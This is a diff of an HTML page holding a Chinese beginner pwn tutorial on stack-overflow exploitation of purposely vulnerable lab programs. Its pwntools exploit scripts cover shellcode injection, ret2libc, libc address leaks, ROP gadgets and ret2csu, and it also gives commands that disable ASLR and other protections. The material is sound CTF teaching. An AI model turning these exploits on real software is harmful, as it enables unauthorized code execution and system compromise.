@@ -7819,15 +7819,15 @@
 <h2 id="pwnrop">pwn入门（蒸米ROP）</h2>
 <h2 id="pwn-x86">pwn 入门（蒸米 x86）</h2>
 <h3 id="_1">一、环境：</h3>
-<p>ubuntu16.04虚拟机
-pwntools
-gdb-peda
-LibcSearcher
+<p>ubuntu16.04虚拟机<br />
+pwntools<br />
+gdb-peda<br />
+LibcSearcher<br />
 pattern.py</p>
 <h3 id="_2">二、寄存器相关知识：</h3>
-<p>EIP：主要用于存放当前代码段即将被执行的下一条指令的偏移，但其本质上并不能直接被指令直接访问。
-最典型的栈溢出利用是覆盖程序的返回地址为攻击者所控制的地址，也就是覆盖EIP
-ESP：栈顶指针，始终指向栈顶
+<p>EIP：主要用于存放当前代码段即将被执行的下一条指令的偏移，但其本质上并不能直接被指令直接访问。<br />
+最典型的栈溢出利用是覆盖程序的返回地址为攻击者所控制的地址，也就是覆盖EIP<br />
+ESP：栈顶指针，始终指向栈顶<br />
 EBP：栈底指针，通常叫栈基址</p>
 <h3 id="_3">三、软件保护机制：</h3>
 <p>CANARY(栈保护)</p>
@@ -7835,16 +7835,16 @@ EBP：栈底指针，通常叫栈基址</p>
 <p>NX（DEP）(数据执行保护 Data Execution Prevention)</p>
 <p>NX即No-eXecute（不可执行）的意思，NX（DEP）的基本原理是将数据所在内存页标识为不可执行，当程序溢出成功转入shellcode时，程序会尝试在数据页面上执行指令，此时CPU就会抛出异常，而不是去执行恶意指令。</p>
 <p>PIE（ASLR）</p>
-<p>内存地址随机化机制（address space layout randomization)，有以下三种情况：
-0 - 表示关闭进程地址空间随机化
-1 - 表示将mmap的基址，stack和vdso页面随机化
+<p>内存地址随机化机制（address space layout randomization)，有以下三种情况：<br />
+0 - 表示关闭进程地址空间随机化<br />
+1 - 表示将mmap的基址，stack和vdso页面随机化<br />
 2 - 表示在1的基础上增加堆（heap）的随机化</p>
 <h3 id="_4">四、简单原理：</h3>
 <p>当一个我们在输入数据时，如果程序对输入没有限制，会导致输入的超出预定的范围，覆盖掉原来的数据</p>
-<p><img alt="1563440952171-921b9cad-44d5-43ad-9852-c6b3a100faa9.jpeg" src="../img/551835_qppii4m4ghuk6di8/1563440952171-921b9cad-44d5-43ad-9852-c6b3a100faa9-823198.jpeg" />
+<p><img alt="1563440952171-921b9cad-44d5-43ad-9852-c6b3a100faa9.jpeg" src="../img/551835_qppii4m4ghuk6di8/1563440952171-921b9cad-44d5-43ad-9852-c6b3a100faa9-823198.jpeg" /><br />
 左边为正常情况，右边是输入超出限制后</p>
 <p>如果我们输入的不是普通的数据，而是构造的数据会怎样？</p>
-<p><img alt="1563440952320-87df56df-09dd-4b1a-91d0-7ad766b46b56.jpeg" src="../img/551835_qppii4m4ghuk6di8/1563440952320-87df56df-09dd-4b1a-91d0-7ad766b46b56-439447.jpeg" />
+<p><img alt="1563440952320-87df56df-09dd-4b1a-91d0-7ad766b46b56.jpeg" src="../img/551835_qppii4m4ghuk6di8/1563440952320-87df56df-09dd-4b1a-91d0-7ad766b46b56-439447.jpeg" /><br />
 构造后栈分布情况</p>
 <p>我们完全可以通过更改原来的返回地址来控制程序的走向，上图中就利用返回地址来实现执行 shellcode</p>
 <h3 id="_5">入手，什么保护都没的</h3>
@@ -7863,16 +7863,16 @@ vulnerable_function();
 write(STDOUT_FILENO, &quot;Hello, World\n&quot;, 13);
 }
 </code></pre>
-<p>使用以下命令进行编译：
+<p>使用以下命令进行编译：<br />
 gcc -m32 -fno-stack-protector -z execstack -o level1 level1.c</p>
-<p>-m32意思是编译为32位的程序
+<p>-m32意思是编译为32位的程序<br />
 -fno-stack-protector和-z execstack这两个参数会分别关掉DEP和Stack Protector</p>
-<p>在 root 权限下执行（为了方便下面的步骤最好一直在root下）：
-echo 0 &gt; /proc/sys/kernel/randomize_va_space
+<p>在 root 权限下执行（为了方便下面的步骤最好一直在root下）：<br />
+echo 0 &gt; /proc/sys/kernel/randomize_va_space<br />
 这样就关掉了整个系统的ASLR</p>
-<p>使用checksec命令来检查一下保护机制：
+<p>使用checksec命令来检查一下保护机制：<br />
 <img alt="1563440952167-c51fa600-d345-4381-b9aa-49eb4e31c2f0.png" src="../img/551835_qppii4m4ghuk6di8/1563440952167-c51fa600-d345-4381-b9aa-49eb4e31c2f0-438737.png" /></p>
-<p>使用一个python脚本来产生点数据
+<p>使用一个python脚本来产生点数据<br />
 python pattern.py create 150</p>
 <p><img alt="1563440952168-6257e966-d29b-4ebc-bece-dd05e847c51e.png" src="../img/551835_qppii4m4ghuk6di8/1563440952168-6257e966-d29b-4ebc-bece-dd05e847c51e-162894.png" /></p>
 <p>gdb ./level1 -&gt; 调试程序</p>
@@ -7881,31 +7881,31 @@ python pattern.py create 150</p>
 <p><img alt="1563440952252-b9ccb291-6505-4b91-95ad-0bcbc1631c6f.png" src="../img/551835_qppii4m4ghuk6di8/1563440952252-b9ccb291-6505-4b91-95ad-0bcbc1631c6f-277177.png" /></p>
 <p>回车后发现报错如下：</p>
 <p><img alt="1563440952189-eb07f0bc-d133-432c-90e5-d323a947b8a6.png" src="../img/551835_qppii4m4ghuk6di8/1563440952189-eb07f0bc-d133-432c-90e5-d323a947b8a6-095139.png" /></p>
-<p>再使用 python 脚本来计算一下偏移：
+<p>再使用 python 脚本来计算一下偏移：<br />
 python pattern.py offset 0x37654136</p>
 <p><img alt="1563440952143-d7f6328a-4f9e-4e24-ab3a-c6f2328c8260.png" src="../img/551835_qppii4m4ghuk6di8/1563440952143-d7f6328a-4f9e-4e24-ab3a-c6f2328c8260-139451.png" /></p>
 <p>这里解释一下，在 gdb 里报错的原因是本来的返回地址被我们输入的字符串覆盖掉了，覆盖为了0x37654136，当程序去返回的时候出错了，使用 pattern.py offset计算出来的就是整个栈的大小</p>
 <p>也就是说此时的栈情况是如图所示：</p>
-<p><img alt="1563440952253-d85218ab-380b-480f-bfff-dd21f1014cad.jpeg" src="../img/551835_qppii4m4ghuk6di8/1563440952253-d85218ab-380b-480f-bfff-dd21f1014cad-847992.jpeg" />
+<p><img alt="1563440952253-d85218ab-380b-480f-bfff-dd21f1014cad.jpeg" src="../img/551835_qppii4m4ghuk6di8/1563440952253-d85218ab-380b-480f-bfff-dd21f1014cad-847992.jpeg" /><br />
 根据之前讲的原理，如果我们能够找到填充的字符串开始的地方，把 0x37654136 改成找到的地址就可以执行我们的语句了</p>
-<p>就像这样：
-<img alt="1563440952257-b48cee01-646b-42bf-b8a8-c1d695ba65ea.jpeg" src="../img/551835_qppii4m4ghuk6di8/1563440952257-b48cee01-646b-42bf-b8a8-c1d695ba65ea-646167.jpeg" />
+<p>就像这样：<br />
+<img alt="1563440952257-b48cee01-646b-42bf-b8a8-c1d695ba65ea.jpeg" src="../img/551835_qppii4m4ghuk6di8/1563440952257-b48cee01-646b-42bf-b8a8-c1d695ba65ea-646167.jpeg" /><br />
 那就可以顺利执行到我们希望能够执行的 shellcode 了</p>
-<p>还有个问题：
+<p>还有个问题：<br />
     gdb 的调试环境会影响 buf 在内存中的位置，虽然我们关闭了 ASLR，但这只能保证 buf 的地址在 gdb 的调试环境中不变，但当我们直接执行 ./level1 的时候，buf 的位置会固定在别的地址上</p>
 <p>这里采用的方法是开启：core dump</p>
-<p>ulimit -c unlimited
+<p>ulimit -c unlimited<br />
 （这里之前是没啥的，但是又一次做的时候只有在root下最后才能成功）</p>
 <p>开启之后，当出现内存错误的时候，系统会生成一个 core dump 文件在当前目录下。然后我们再用 gdb 查看这个 core 文件就可以获取到 buf 真正的地址了。</p>
-<p>如果没有，尝试执行这个，来改为当前目录下生成转储文件
+<p>如果没有，尝试执行这个，来改为当前目录下生成转储文件<br />
 <code>echo "./core" &gt; /proc/sys/kernel/core_pattern</code></p>
 <p><img alt="1563440952162-f4078a8c-0f66-4747-b418-bb29f59626af.png" src="../img/551835_qppii4m4ghuk6di8/1563440952162-f4078a8c-0f66-4747-b418-bb29f59626af-419857.png" /></p>
-<p>使用gdb调试转储的
+<p>使用gdb调试转储的<br />
 gdb level1 core</p>
 <p><img alt="1563440952374-c935a881-acd8-4945-813f-b8974c285edb.png" src="../img/551835_qppii4m4ghuk6di8/1563440952374-c935a881-acd8-4945-813f-b8974c285edb-034282.png" /></p>
 <p>使用 x/10s $esp-144 查看shellcode地址</p>
 <p><img alt="1563440952292-0b7941e2-986e-4231-9868-ee2fcddf6f8f.png" src="../img/551835_qppii4m4ghuk6di8/1563440952292-0b7941e2-986e-4231-9868-ee2fcddf6f8f-796147.png" /></p>
-<p>为什么是 esp-144 ？
+<p>为什么是 esp-144 ？<br />
     因为我们报错的时候其实已经执行的到返回地址了，所以要在 140 的栈空间的基础上加上 4 字节的返回地址空间</p>
 <p>用 python 结合 pwntools 写利用脚本</p>
 <pre><code class="language-python">from pwn import *
@@ -7927,7 +7927,7 @@ p.interactive()
 <p>ret2libc 即控制函数的执行 libc 中的函数，通常是返回至某个函数的 plt 处或者函数的具体位置，一般情况下，我们会选择执行 system("/bin/sh")。</p>
 <p>那么我们如何得到 system 函数的地址呢？这里就主要利用了两个知识点</p>
 <blockquote>
-<p>system 函数属于 libc，而 libc.so 动态链接库中的函数之间相对偏移是固定的。
+<p>system 函数属于 libc，而 libc.so 动态链接库中的函数之间相对偏移是固定的。<br />
 即使程序有 ASLR 保护，也只是针对于地址中间位进行随机，最低的 12 位并不会发生改变。</p>
 </blockquote>
 <p>简单点说就是我们现在没法在栈上执行需要的命令了，但是我们可以去别的地方执行，在 libc.so 中就正好有我们需要找的：system("/bin/sh")。</p>
@@ -7935,18 +7935,18 @@ p.interactive()
 <p><img alt="1563440952197-f28f883b-20b4-4c3f-9252-f7c5d8209789.png" src="../img/551835_qppii4m4ghuk6di8/1563440952197-f28f883b-20b4-4c3f-9252-f7c5d8209789-427535.png" /></p>
 <p>前面说到关掉 ASLR 后 system() 函数在内存中的地址是不会变化的，并且 libc.so 中也包含 "/bin/sh" 这个字符串，并且这个字符串的地址也是固定的</p>
 <p>我们使用 gdb 来找到这些地址</p>
-<p>首先用 gdb ./level2 调试
+<p>首先用 gdb ./level2 调试<br />
 我们首先在main函数上下一个断点：b main</p>
 <p><img alt="1563440952372-0da7b19c-613b-40da-8212-5240b3a185b2.png" src="../img/551835_qppii4m4ghuk6di8/1563440952372-0da7b19c-613b-40da-8212-5240b3a185b2-591317.png" /></p>
 <p>然后执行程序：r</p>
 <p><img alt="1563440952267-175b28eb-51b6-49f4-b4df-0c9592134772.png" src="../img/551835_qppii4m4ghuk6di8/1563440952267-175b28eb-51b6-49f4-b4df-0c9592134772-762859.png" /></p>
-<p>这样的话程序会加载 libc.so 到内存中
+<p>这样的话程序会加载 libc.so 到内存中<br />
 然后我们就可以通过：print system 这个命令来获取 system 函数在内存中的位置</p>
 <p><img alt="1563440952346-6754a1d7-6424-47ad-9449-dfa2e5fb13da.png" src="../img/551835_qppii4m4ghuk6di8/1563440952346-6754a1d7-6424-47ad-9449-dfa2e5fb13da-725218.png" /></p>
 <p>接下来我们可以通过find命令来查找："/bin/sh" 这个字符串</p>
 <p><img alt="1563440952213-c2bbf0fb-817d-425f-a560-7762721b0b60.png" src="../img/551835_qppii4m4ghuk6di8/1563440952213-c2bbf0fb-817d-425f-a560-7762721b0b60-825734.png" /></p>
-<p>这样就找到了我们需要的数据：
-system地址：0xf7e41940
+<p>这样就找到了我们需要的数据：<br />
+system地址：0xf7e41940<br />
 /bin/sh地址：0xf7f6002b</p>
 <p>写出 exp：</p>
 <pre><code class="language-python">from pwn import *
@@ -7958,22 +7958,22 @@ payload =  'A'*140 + p32(systemaddr) + p32(ret) + p32(binshaddr)
 p.send(payload)
 p.interactive()
 </code></pre>
-<p>关于 ret 地址：
+<p>关于 ret 地址：<br />
 system() 后面跟的是执行完 system() 后要返回的地址，接下来才是要给 system() 传递的参数："/bin/sh" 字符串的地址。而我们目的是执行 "/bin/sh"，ret 无所谓。</p>
-<p>现在栈的分布大致是：
+<p>现在栈的分布大致是：<br />
 <img alt="1563440952217-4400e223-f5f5-4dc6-875e-6fdf7afc9f05.jpeg" src="../img/551835_qppii4m4ghuk6di8/1563440952217-4400e223-f5f5-4dc6-875e-6fdf7afc9f05-560982.jpeg" /></p>
-<p>利用成功：
+<p>利用成功：<br />
 <img alt="1563440952334-4711410c-a517-43f1-ba6a-972ccc4d0de8.png" src="../img/551835_qppii4m4ghuk6di8/1563440952334-4711410c-a517-43f1-ba6a-972ccc4d0de8-825380.png" /></p>
 <h3 id="aslr">再迈一步，打开ASLR</h3>
-<p>现在我们打开 ASLR，依旧是在root下
+<p>现在我们打开 ASLR，依旧是在root下<br />
 echo 2 &gt; /proc/sys/kernel/randomize_va_space</p>
-<p>这样因为地址随机化，我们以前的exp已经无效了
+<p>这样因为地址随机化，我们以前的exp已经无效了<br />
 我们可以用 ldd level2 命令看一下 libc 的地址，每一次都在变化</p>
 <p><img alt="1563440952246-d192d0a9-0d27-494e-ae46-1c0ea0b56449.png" src="../img/551835_qppii4m4ghuk6di8/1563440952246-d192d0a9-0d27-494e-ae46-1c0ea0b56449-406039.png" /></p>
-<p>那我们该怎么解决呐？
+<p>那我们该怎么解决呐？<br />
 我们可以先泄漏出 libc.so 某些函数在内存中的地址，然后再利用泄漏出的函数地址根据偏移量计算出 system() 函数和 /bin/sh 字符串在内存中的地址，然后再执行我们的 ret2libc 的 shellcode 就可以了</p>
-<p>先把程序用到的libc文件拷贝到当前目录
-cp /lib32/libc.so.6 libc.so
+<p>先把程序用到的libc文件拷贝到当前目录<br />
+cp /lib32/libc.so.6 libc.so<br />
 这样当前目录下就多了一个libc.so文件</p>
 <p>使用：objdump -d -j .plt level2 查看可以利用的函数</p>
 <p><img alt="1563440952202-9c76a3b2-7157-4fa0-8862-be511c4835ad.png" src="../img/551835_qppii4m4ghuk6di8/1563440952202-9c76a3b2-7157-4fa0-8862-be511c4835ad-152498.png" /></p>
@@ -7996,10 +7996,10 @@ payload2 = 'a'*140  + p32(system_addr) + p32(vulfun_addr) + p32(binsh_addr)
 p.send(payload2)
 p.interactive()
 </code></pre>
-<p>来解析一下 exp：
-payload1的意思是：填充 140 个 A 后返回地址覆盖为 write 函数，通过 got_write 将 write 函数的真实地址泄露出来，执行完成 write 函数之后，返回地址为 vul 函数，再次利用 vul 函数的溢出漏洞，完成漏洞利用工作
+<p>来解析一下 exp：<br />
+payload1的意思是：填充 140 个 A 后返回地址覆盖为 write 函数，通过 got_write 将 write 函数的真实地址泄露出来，执行完成 write 函数之后，返回地址为 vul 函数，再次利用 vul 函数的溢出漏洞，完成漏洞利用工作<br />
 next()是用来查找字符串的，比如next(libc.search('/bin/sh'))用来查找包含/bin/sh（字符串、某个函数或数值）的地址</p>
-<p>利用成功：
+<p>利用成功：<br />
 <img alt="1563440952316-bb19efa1-73d2-4bdb-aa74-b2dc5cdcf62d.png" src="../img/551835_qppii4m4ghuk6di8/1563440952316-bb19efa1-73d2-4bdb-aa74-b2dc5cdcf62d-595488.png" /></p>
 <h3 id="libcso">如果没有libc.so呐</h3>
 <p>实际上，在做题的时候没法查看 libc 的版本之类的，更没法拷贝到程序所在目录，连上服务器后就是程序运行起来的情况，那这时候就需要新的知识来解决了</p>
@@ -8009,14 +8009,14 @@ next()是用来查找字符串的，比如next(libc.search('/bin/sh'))用来查�
 <p><img alt="1563541318816-8c22ddee-b977-4e41-9a42-28fed780a403.png" src="../img/551835_qppii4m4ghuk6di8/1563541318816-8c22ddee-b977-4e41-9a42-28fed780a403-749402.png" /></p>
 <p>我们对比一下使用 LibcSearcher 和不使用的脚本的区别</p>
 <p><img alt="1563541318758-1500a8cf-6f81-4e18-b356-27cfee1be8f1.png" src="../img/551835_qppii4m4ghuk6di8/1563541318758-1500a8cf-6f81-4e18-b356-27cfee1be8f1-305932.png" /></p>
-<p>可以看到主要区别就在这四行里面，下面讲解一下：
-libc=LibcSearcher('write',write_addr)
+<p>可以看到主要区别就在这四行里面，下面讲解一下：<br />
+libc=LibcSearcher('write',write_addr)<br />
 通过之前的 payload1 我们已经泄露出了 write 函数的地址了，我们直接使用 LibcSearcher('write',write_addr) 就可以找出 libc 的版本了</p>
-<p>libcbase=write_addr-libc.dump("write")
+<p>libcbase=write_addr-libc.dump("write")<br />
 使用 libc.dump("write") 可以计算出 write 的偏移地址，再用 write_addr 减去偏移地址就得到了 libc 的基址</p>
-<p>system_addr=libcbase+libc.dump("system")
+<p>system_addr=libcbase+libc.dump("system")<br />
 使用基址加上 system 的偏移，得到 system 的实际地址</p>
-<p>binsh_addr=libcbase+libc.dump("str_bin_sh")
+<p>binsh_addr=libcbase+libc.dump("str_bin_sh")<br />
 使用基址加上 /bin/sh 字符串的偏移，得到 /bin/sh 的实际地址</p>
 <p>使用 LibcSearcher 的脚本</p>
 <pre><code class="language-python">from pwn import *
@@ -8059,13 +8059,13 @@ int main(int argc, char** argv) {
     vulnerable_function();
 }
 </code></pre>
-<p>编译：
+<p>编译：<br />
 <code>gcc -fno-stack-protector level3.c -o level3</code></p>
 <p>之后通过<code>python pattern.py create 150</code>创造150个字符，找溢出点，输入后程序并没有停在类似 0x41414141那样的地方，而是停在了函数中</p>
 <p><img alt="image.png" src="../img/551835_qppii4m4ghuk6di8/1574822005681-23c276e8-130c-468f-85f8-d0db99c23d08-271312.png" /></p>
-<p>这是因为程序使用的内存地址不能大于 <code>0x00007fffffffffff</code> 否则会抛出异常，但是我们依然可以通过<code>x/x $rsp</code> 来查看即将返回的地址，如上图：0x6261616b... 通过计算，偏移是 136，如果构造一个小一点的返回地址他就可以正常显示出来比如：'a'*136+"ABCDEF/x00/x00"（注意是小端序）
+<p>这是因为程序使用的内存地址不能大于 <code>0x00007fffffffffff</code> 否则会抛出异常，但是我们依然可以通过<code>x/x $rsp</code> 来查看即将返回的地址，如上图：0x6261616b... 通过计算，偏移是 136，如果构造一个小一点的返回地址他就可以正常显示出来比如：'a'*136+"ABCDEF/x00/x00"（注意是小端序）<br />
 这样就可以成功看到返回地址被覆盖成功了</p>
-<p><img alt="image.png" src="../img/551835_qppii4m4ghuk6di8/1574822363881-4cc1baf7-458c-48f3-a90a-6596bef295ae-108656.png" />
+<p><img alt="image.png" src="../img/551835_qppii4m4ghuk6di8/1574822363881-4cc1baf7-458c-48f3-a90a-6596bef295ae-108656.png" /><br />
 <img alt="image.png" src="../img/551835_qppii4m4ghuk6di8/1574822581989-f692d7f4-a513-4568-9b44-6ec7f75550d8-097177.png" /></p>
 <p>构造exp：</p>
 <pre><code class="language-python">from pwn import *
@@ -8099,8 +8099,8 @@ int main(int argc, char** argv) {
 }
 </code></pre>
 <p>编译：<code>gcc -fno-stack-protector level4.c -o level4 -ldl</code></p>
-<p>程序会给出 system 的地址，只需要自己搞一个 /bin/sh 就可以了，但是参数是存在寄存器中的，所以需要找一个 <code>pop rdi ；ret</code>
-在程序里面找不到可以在程序使用的 libc.so 来寻找
+<p>程序会给出 system 的地址，只需要自己搞一个 /bin/sh 就可以了，但是参数是存在寄存器中的，所以需要找一个 <code>pop rdi ；ret</code><br />
+在程序里面找不到可以在程序使用的 libc.so 来寻找<br />
 <code>ROPgadget --binary libc.so.6 --only "pop|ret" | grep rdi</code></p>
 <p><img alt="image.png" src="../img/551835_qppii4m4ghuk6di8/1574824983116-e36aac31-fcec-4618-a872-f62ea7ae68ed-660138.png" /></p>
 <p>写出exp：</p>
@@ -8133,9 +8133,9 @@ p.interactive()
 </code></pre>
 <p>通过构造栈上的数据，调用 1 然后返回到 2 就可以控制寄存器</p>
 <p><img alt="image.png" src="../img/551835_qppii4m4ghuk6di8/1575199937493-61042764-4d11-4e0c-87cc-5901916d4cdd-758507.png" /></p>
-<p>临时参考：<a href="https://blog.csdn.net/weixin_43467772/article/details/89131527">https://blog.csdn.net/weixin_43467772/article/details/89131527</a>
+<p>临时参考：<a href="https://blog.csdn.net/weixin_43467772/article/details/89131527">https://blog.csdn.net/weixin_43467772/article/details/89131527</a><br />
 首先通过溢出把一堆数据写在栈上，此时返回地址覆盖为 gadgets1，调用 gaegets1 的时候 rsp+8 通过 gadgets1 把栈上的数据写在寄存器里面，同时把 rsp 再加一下让程序返回到 gadgets2</p>
-<p>gadgets2 会把之前寄存器上存的数据放在需要的寄存器上（参数存放顺序：RDI, RSI, RDX, RCX, R8 和 R9）
+<p>gadgets2 会把之前寄存器上存的数据放在需要的寄存器上（参数存放顺序：RDI, RSI, RDX, RCX, R8 和 R9）<br />
 把 write 函数需要的参数部署好之后通过 call(r12+rbx*8) 之前把 rbx设置成了 0，当程序执行完 write 函数以后会自己回到这里（因为是 call，正常调用）所以不用管返回地址，继续执行，此时还会执行 gadgets1 上面那张图那样子，gadgets1 里面有一段 add rsp,38h 所以还要填充 38h 个字节把这一段填充掉，使得程序返回的时候是我们写在栈上的 main_addr</p>
 <p><img alt="image.png" src="../img/551835_qppii4m4ghuk6di8/1575210129261-14f89fac-6341-4b83-8a00-4d2c86a4e5b3-525247.png" /></p>
 <p>剩下的同理，只是 read 从标准输入流（0，即控制台）读取 0x100 放到 .bss 段里面</p>
